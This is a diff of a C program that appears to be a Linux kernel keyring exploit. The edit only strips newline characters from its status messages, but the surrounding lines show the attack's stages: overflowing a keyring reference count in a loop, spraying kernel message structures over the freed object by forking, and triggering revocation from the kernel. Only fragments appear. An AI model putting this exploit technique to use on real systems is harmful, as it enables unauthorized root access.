@@ -56,7 +56,7 @@ struct { long mtype;
 	int msqid;
 
 	if (argc != 2) {
-		puts("usage: ./keys <key_name>\n");
+		puts("usage: ./keys <key_name>");
 		return 1;
 	}
 
@@ -98,7 +98,7 @@ struct { long mtype;
 	}
 
 
-	puts("Increfing...\n");
+	puts("Increfing...");
     for (i = 1; i < 0xfffffffd; i++) {
         if (i == (0xffffffff - l)) {
             l = l/2;
@@ -118,7 +118,7 @@ struct { long mtype;
         }
     }
 
-    puts("finished increfing\n");
+    puts("finished increfing");
     puts("forking...");
     /* allocate msg struct in the kernel rewriting the freed keyring object */
     for (i=0; i<64; i++) {
@@ -145,11 +145,11 @@ struct { long mtype;
         }
     }
    
-    puts("finished forking\n");
+    puts("finished forking");
     sleep(5);
 
     /* call userspace_revoke from kernel */
-    puts("caling revoke...\n");
+    puts("caling revoke...");
     if (keyctl(KEYCTL_REVOKE, KEY_SPEC_SESSION_KEYRING) == -1) {
         perror("keyctl_revoke");
     }
